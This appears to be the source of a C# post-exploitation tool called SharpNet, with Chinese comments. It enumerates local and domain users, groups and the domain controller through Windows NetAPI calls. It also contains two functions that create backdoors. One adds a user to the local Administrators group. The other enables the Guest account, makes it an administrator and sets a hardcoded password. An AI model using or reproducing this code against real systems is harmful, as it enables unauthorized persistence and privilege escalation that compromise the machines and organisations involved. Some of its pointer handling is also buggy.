using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections;
using System.Runtime;
using System.Net.NetworkInformation;
using System.Net;
using System.DirectoryServices;

namespace SharpNet
{
    class Program
    {
        static void Main(string[] args)
        {
            //GetNetGroupUsers("domain users", GetDomainControllerName());
            if (args.Contains("/do") || args.Contains("/domain"))
            {
                string dc = GetDomainControllerName();
                if (args.Contains("user"))
                {
                    if (args.Length == 3)
                    {
                        string username = args[1];
                        GetUserInfo(username, serverName: dc);
                    }
                    if (args.Length == 2)
                    {
                        GetAllUsers(serverName: dc);
                    }
                }
                if (args.Contains("group"))
                {
                    if (args.Length == 3)
                    {
                        string groupname = args[1];
                        try
                        {
                            GetNetGroupUsers(groupname, GetDomainControllerName());
                        }
                        catch
                        {
                            ;
                        }

                    }
                    if (args.Length == 2)
                    {
                        GetAllGroups(dc);
                    }
                }
            }
            if (args.Contains("/add"))
            {
                AddUser(args[0],args[1]);
            }
            if (args.Contains("/active"))
            {
                ActiveGuest();
            }
            else
            {
                if (args.Contains("user") & !args.Contains("/add"))
                {
                    if (args.Length == 2)
                    {
                        string username = args[1];
                        GetUserInfo(username);
                    }
                    else
                        GetAllUsers();
                }
                if (args.Contains("group"))
                {
                    if (args.Length == 2)
                    {
                        string groupname = args[1];
                        try
                        {
                            foreach (string group in GetLocalGroupMembers(groupname))
                            {
                                Console.WriteLine(group);
                            }
                        }
                        catch
                        {
                            ;
                        }

                    }
                    if (args.Length == 1)
                    {
                        LocalGroupEnum();
                    }
                }
            }

        }

        /// <summary>
        /// 获取本地组成员
        /// </summary>
        /// <param name="groupName"></param>
        /// <returns>group users</returns>
        public static string[] GetLocalGroupMembers(string groupName, string serverName = null)
        {
            // returns the "DOMAIN\user" members for a specified local group name
            // adapted from boboes' code at https://stackoverflow.com/questions/33935825/pinvoke-netlocalgroupgetmembers-runs-into-fatalexecutionengineerror/33939889#33939889

            //string computerName = "WIN-BLA6KEJV6V7.cate4cafe.com"; // null for the local machine

            int EntriesRead;
            int TotalEntries;
            IntPtr Resume;
            IntPtr bufPtr;

            uint retVal = NetworkAPI.NetLocalGroupGetMembers(serverName, groupName, 2, out bufPtr, -1, out EntriesRead, out TotalEntries, out Resume);

            if (retVal != 0)
            {
                if (retVal == NetworkAPI.ERROR_ACCESS_DENIED) { Console.WriteLine("Access denied"); return null; }
                if (retVal == NetworkAPI.ERROR_MORE_DATA) { Console.WriteLine("ERROR_MORE_DATA"); return null; }
                if (retVal == NetworkAPI.ERROR_NO_SUCH_ALIAS) { Console.WriteLine("Group not found"); return null; }
                if (retVal == NetworkAPI.NERR_InvalidComputer) { Console.WriteLine("Invalid computer name"); return null; }
                if (retVal == NetworkAPI.NERR_GroupNotFound) { Console.WriteLine("Group not found"); return null; }
                if (retVal == NetworkAPI.SERVER_UNAVAILABLE) { Console.WriteLine("Server unavailable"); return null; }
                Console.WriteLine("Unexpected NET_API_STATUS: " + retVal.ToString());
                return null;
            }

            if (EntriesRead > 0)
            {
                string[] names = new string[EntriesRead];
                NetworkAPI.LOCALGROUP_MEMBERS_INFO_2[] Members = new NetworkAPI.LOCALGROUP_MEMBERS_INFO_2[EntriesRead];
                IntPtr iter = bufPtr;

                for (int i = 0; i < EntriesRead; i++)
                {
                    Members[i] = (NetworkAPI.LOCALGROUP_MEMBERS_INFO_2)Marshal.PtrToStructure(iter, typeof(NetworkAPI.LOCALGROUP_MEMBERS_INFO_2));

                    //x64 safe
                    iter = new IntPtr(iter.ToInt64() + Marshal.SizeOf(typeof(NetworkAPI.LOCALGROUP_MEMBERS_INFO_2)));

                    names[i] = Members[i].lgrmi2_domainandname;
                }
                NetworkAPI.NetApiBufferFree(bufPtr);

                return names;
            }
            else
            {
                return null;
            }
        }

        /// <summary>
        /// 获取域组成员
        /// </summary>
        /// <param name="groupName"></param>
        /// <param name="serverName"></param>
        public static void GetNetGroupUsers(string groupName, string serverName)
        {
            uint preferredMaximumLength = 0xFFFFFFFF;
            uint returnedEntryCount = 0;
            uint totalEntries = 0;
            uint rc = 0;
            int GROUP_USERS_INFO_0_SIZE;

            IntPtr UserInfoPtr = IntPtr.Zero;
            IntPtr resumeHandle = IntPtr.Zero;

            int newOffset;
            ArrayList userList = new ArrayList();
            string userName;
            unsafe
            {
                GROUP_USERS_INFO_0_SIZE = sizeof(NetworkAPI.GROUP_USERS_INFO_0);
            }
            rc = NetworkAPI.NetGroupGetUsers(
                    Marshal.StringToCoTaskMemAuto(serverName),
                    Marshal.StringToCoTaskMemAuto(groupName),
                    0,
                    ref UserInfoPtr,
                    preferredMaximumLength,
                    ref returnedEntryCount,
                    ref totalEntries,
                    ref resumeHandle);
            for (int i = 0; i < returnedEntryCount; i++)
            {
                newOffset = UserInfoPtr.ToInt32() + GROUP_USERS_INFO_0_SIZE * i;
                NetworkAPI.GROUP_USERS_INFO_0 userInfo = (NetworkAPI.GROUP_USERS_INFO_0)Marshal.PtrToStructure(new IntPtr(newOffset), typeof(NetworkAPI.GROUP_USERS_INFO_0));
                userName = Marshal.PtrToStringAuto(userInfo.groupname);
                userList.Add(userName);
            }
            foreach (string user in userList)
            {
                Console.WriteLine(user);
            }
        }
        /// <summary>
        /// 枚举本地组
        /// </summary>
        /// <param name="serverName"></param>
        public static void LocalGroupEnum(string serverName = null)
        {
            string tempStr = "";
            int entriesread;
            int totalentries;
            int resume_handle;
            IntPtr bufPtr;

            NetworkAPI.NetLocalGroupEnum(serverName, 1, out bufPtr, -1, out entriesread, out totalentries, out resume_handle);

            if (entriesread > 0)
            {
                NetworkAPI.LOCALGROUP_INFO_1[] GroupInfo = new NetworkAPI.LOCALGROUP_INFO_1[entriesread];
                IntPtr iter = bufPtr;

                //tempStr = "<?xml version=\"1.0\" encoding=\"gb2312\" ?>\r\n";
                //tempStr += "<INFO>\r\n";
                for (int i = 0; i < entriesread; i++)
                {
                    tempStr += GroupInfo[i].LocalGroup_Name_1 + "\r\n";
                    GroupInfo[i] = (NetworkAPI.LOCALGROUP_INFO_1)Marshal.PtrToStructure(iter, typeof(NetworkAPI.LOCALGROUP_INFO_1));
                    iter = (IntPtr)((int)iter + Marshal.SizeOf(typeof(NetworkAPI.LOCALGROUP_INFO_1)));
                    tempStr += GroupInfo[i].LocalGroup_Name_1 + " " + GroupInfo[i].LocalGroup_Comment_1 + "\r\n";
                    //tempStr += "<ITEM value=\"" + GroupInfo[i].LocalGroup_Comment_1 + "\">" + GroupInfo[i].LocalGroup_Name_1 + "</ITEM>\r\n";
                }
                // tempStr += "</INFO>";
                Console.WriteLine(tempStr);
            }

        }
        /// <summary>
        /// 枚举域组
        /// </summary>
        /// <param name="ServerName"></param>
        private static void GetAllGroups(string ServerName)
        {
            int size = 1024;    //Start with 1k
            IntPtr bufptr = new IntPtr(size);
            int level = 0;
            int prefmaxlen = 1023;
            int entriesread = 0;
            int totalentries = 0;
            int resume_handle = 0;
            int err = 0;
            do
            {
                err = NetworkAPI.NetGroupEnum(
                    ServerName,
                    level,
                    out bufptr,
                    prefmaxlen,
                    out entriesread,
                    out totalentries,
                    ref resume_handle
                );
                switch (err)
                {
                    //If there is more data, double the size of the buffer...
                    case 2123:        //NERR_BufTooSmall
                    case 234:        //ERROR_MORE_DATA
                        size *= 2;
                        bufptr = new IntPtr(size);
                        prefmaxlen = size - 1;    //Increase the size you want read as well
                        resume_handle = 0;    //And reset the resume_handle or you'll just pick up where you left off.

                        break;
                    case 2351:    //NERR_InvalidComputer
                    case 0:        //NERR_Success
                    default:
                        break;
                }
            }
            while (err == 234);    // and start over

            //GROUP_INFO_0 group=new GROUP_INFO_0(); //See user type above
            NetworkAPI.GROUP_INFO_0 group;
            string[] ret = new string[totalentries];
            IntPtr iter = bufptr;

            for (int i = 0; i < totalentries; i++)
            {
                group = (NetworkAPI.GROUP_INFO_0)Marshal.PtrToStructure(iter, typeof(NetworkAPI.GROUP_INFO_0));
                ret[i] = group.grpi0_name;
                iter = (IntPtr)((int)iter + Marshal.SizeOf(typeof(NetworkAPI.GROUP_INFO_0)));
            }

            foreach (string groupName in ret)
            {
                Console.WriteLine(groupName);
            }
        }
        /// <summary>
        /// 获取域控机器名
        /// </summary>
        private static string GetDomainControllerName()
        {
            string DomainControllerName = null;
            IntPtr pDomainInfo;
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            if (NetworkAPI.DsGetDcName(
                    string.Empty,//ComputerName
                    properties.DomainName,//DomainName
                    IntPtr.Zero,//DomainGuid
                    string.Empty,//SiteName
                    NetworkAPI.DSGETDCNAME_FLAGS.DS_DIRECTORY_SERVICE_REQUIRED |
                    NetworkAPI.DSGETDCNAME_FLAGS.DS_GC_SERVER_REQUIRED |
                    NetworkAPI.DSGETDCNAME_FLAGS.DS_IS_DNS_NAME |
                    NetworkAPI.DSGETDCNAME_FLAGS.DS_RETURN_DNS_NAME,
                    out pDomainInfo) == NetworkAPI.ERROR_SUCCESS)
            {
                NetworkAPI.DomainControllerInfo dci = new NetworkAPI.DomainControllerInfo();
                dci = (NetworkAPI.DomainControllerInfo)Marshal.PtrToStructure(pDomainInfo, typeof(NetworkAPI.DomainControllerInfo));
                NetworkAPI.NetApiBufferFree(pDomainInfo);
                pDomainInfo = IntPtr.Zero;
                DomainControllerName = dci.DomainControllerName;
            }
            return DomainControllerName;
        }

        /// <summary>
        /// 枚举所有用户
        /// </summary>
        /// <param name="serverName"></param> null = local users
        private static void GetAllUsers(string serverName = null)
        {

            int EntriesRead;
            int TotalEntries;
            int Resume;
            IntPtr bufPtr;
            NetworkAPI.NetUserEnum(serverName, 0, 2, out bufPtr, -1, out EntriesRead, out TotalEntries, out Resume);
            if (EntriesRead > 0)
            {
                NetworkAPI.USER_INFO_0[] Users = new NetworkAPI.USER_INFO_0[EntriesRead];
                IntPtr iter = bufPtr;
                for (int i = 0; i < EntriesRead; i++)
                {
                    Users[i] = (NetworkAPI.USER_INFO_0)Marshal.PtrToStructure(iter, typeof(NetworkAPI.USER_INFO_0));
                    iter = (IntPtr)((int)iter + Marshal.SizeOf(typeof(NetworkAPI.USER_INFO_0)));
                    Console.WriteLine(Users[i].UserName);
                }
            }
        }
        /// <summary>
        /// 获取用户信息
        /// </summary>
        /// <param name="username"></param>
        private static void GetUserInfo(string username, string serverName = null)
        {
            IntPtr bufPtr;
            NetworkAPI.USER_INFO_4 User = new NetworkAPI.USER_INFO_4();
            if (NetworkAPI.NetUserGetInfo(serverName, username, 4, out bufPtr) == 0)
            {
                User = (NetworkAPI.USER_INFO_4)Marshal.PtrToStructure(bufPtr, typeof(NetworkAPI.USER_INFO_4));
                DateTime logon = new DateTime(1970, 1, 1).AddSeconds(User.last_logon);
                DateTime logoff = new DateTime(1970, 1, 1).AddSeconds(User.last_logoff);

                Console.WriteLine("用户名             {0} ", User.name);
                Console.WriteLine("全名               {0} ", User.full_name);
                Console.WriteLine("上次登录时间        {0} ", logon.ToString());
                Console.WriteLine("上次注销时间        {0} ", logoff.ToString());
                Console.WriteLine("home_dir           {0} ", User.home_dir);
                Console.WriteLine("logon_server       {0} ", User.logon_server);
                Console.WriteLine("script_path        {0} ", User.script_path);
                // Console.WriteLine("flag               {0} ", User.flags.ToString());
                //账户启用
                // https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/10bf6c8e-34af-4cf9-8dff-6b6330922863
                uint flag = 0x00000002;
                if ((User.flags & flag) != flag)
                {
                    Console.WriteLine("账户启用            {0} ", "yes");
                }
                else
                    Console.WriteLine("账户启用            {0} ", "no");
                flag = 0x00010000;
                if ((User.flags & flag) != flag)
                {
                    Console.WriteLine("密码永不过期        {0} ", "yes");
                }
                flag = 0x00800000;
                if ((User.flags & flag) != flag)
                {
                    Console.WriteLine("密码过期           {0} ", "yes");
                }
            }
            NetworkAPI.NetApiBufferFree(bufPtr);
            GetUserGroups(username, serverName);

        }
        /// <summary>
        /// 用户所在组
        /// </summary>
        /// <param name="username"></param>
        private static void GetUserGroups(string username, string serverName = null)
        {
            ArrayList globalGroup = new ArrayList();
            ArrayList localGroup = new ArrayList();
            int EntriesRead;
            int TotalEntries;
            IntPtr bufPtr;
            int ErrorCode;
            string _ErrorMessage;
            // 全局组
            ErrorCode = NetworkAPI.NetUserGetGroups(serverName, username, 0, out bufPtr, 1024, out EntriesRead, out TotalEntries);
            if (ErrorCode == 0)
            {
                _ErrorMessage = "Successful";
            }
            else
            {
                _ErrorMessage = "Username or computer not found";
            }
            if (EntriesRead > 0)
            {
                NetworkAPI.LOCALGROUP_USERS_INFO_0[] RetGroups = new NetworkAPI.LOCALGROUP_USERS_INFO_0[EntriesRead];
                IntPtr iter = bufPtr;
                for (int i = 0; i < EntriesRead; i++)
                {
                    RetGroups[i] = (NetworkAPI.LOCALGROUP_USERS_INFO_0)Marshal.PtrToStructure(iter, typeof(NetworkAPI.LOCALGROUP_USERS_INFO_0));
                    iter = (IntPtr)((int)iter + Marshal.SizeOf(typeof(NetworkAPI.LOCALGROUP_USERS_INFO_0)));
                    globalGroup.Add(RetGroups[i].groupname);
                }
                NetworkAPI.NetApiBufferFree(bufPtr);
            }
            Console.WriteLine("全局组：");
            foreach (string group in globalGroup)
            {
                Console.WriteLine("         " + group);
            }

            ErrorCode = NetworkAPI.NetUserGetLocalGroups(serverName, username, 0, 0, out bufPtr, 1024, out EntriesRead, out TotalEntries);
            if (ErrorCode == 0)
            {
                _ErrorMessage = "Successful";
            }
            else
            {
                _ErrorMessage = "Username or computer not found";
            }
            if (EntriesRead > 0)
            {
                NetworkAPI.LOCALGROUP_USERS_INFO_0[] RetGroups1 = new NetworkAPI.LOCALGROUP_USERS_INFO_0[EntriesRead];
                IntPtr iter = bufPtr;
                for (int i = 0; i < EntriesRead; i++)
                {
                    RetGroups1[i] = (NetworkAPI.LOCALGROUP_USERS_INFO_0)Marshal.PtrToStructure(iter, typeof(NetworkAPI.LOCALGROUP_USERS_INFO_0));
                    iter = (IntPtr)((int)iter + Marshal.SizeOf(typeof(NetworkAPI.LOCALGROUP_USERS_INFO_0)));
                    localGroup.Add(RetGroups1[i].groupname);
                }
                NetworkAPI.NetApiBufferFree(bufPtr);
            }
            Console.WriteLine("本地组：");
            foreach (string group in localGroup)
            {
                Console.WriteLine("         " + group);
            }
        }
        /// <summary>
        /// 添加用户
        /// </summary>
        private static void AddUser(string username,string password)
        {
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();          
            DirectoryEntry AD = new DirectoryEntry("WinNT://" + properties.HostName + ",computer");
            DirectoryEntry newuser = AD.Children.Add(username, "user");
            newuser.Invoke("SetPassword", new object[] { password });
            newuser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
            try
            {
                newuser.CommitChanges();
                Console.WriteLine("账户创建成功");
            }
            catch
            {
                Console.WriteLine("账户创建失败");
            }
            try
            {
                DirectoryEntry grp;
                grp = AD.Children.Find("Administrators", "group");
                if (grp != null)
                {
                    grp.Invoke("Add", new object[] { newuser.Path.ToString() });
                }
                Console.WriteLine("已添加进管理组");
            }
            catch
            {
                Console.WriteLine("添加管理组失败");
            }
            
        }
        private static void ActiveGuest()
        {
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            DirectoryEntry user = new DirectoryEntry("WinNT://" + properties.HostName + "/" + "guest" + ",user");
            try
            {
                user.InvokeSet("AccountDisabled", false);
                user.CommitChanges();
                Console.WriteLine("guest激活成功");
            }
            catch
            {
                ;
            }
            DirectoryEntry AD = new DirectoryEntry("WinNT://" + properties.HostName + ",computer");
            DirectoryEntry newuser = AD.Children.Add("guest", "user");
            DirectoryEntry grp;
            grp = AD.Children.Find("Administrators", "group");
            try
            {
                if (grp != null)
                {
                    grp.Invoke("Add", new object[] { newuser.Path.ToString() });
                }
                Console.WriteLine("guest加入管理员组成功");
            }
            catch
            {
                ;
            }
            //DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + properties.HostName + ",computer");
            try
            {
                DirectoryEntry user1 = AD.Children.Find("guest", "user");
                object[] password = new object[] { "#1qaz@WSX" };
                object ret = user.Invoke("SetPassword", password);
                user1.CommitChanges();
                user1.Close();
                Console.WriteLine("guest 密码： #1qaz@WSX");
            }
            catch
            {
                ;
            }     
            user.Close();
            AD.Close();
        }
    }
}
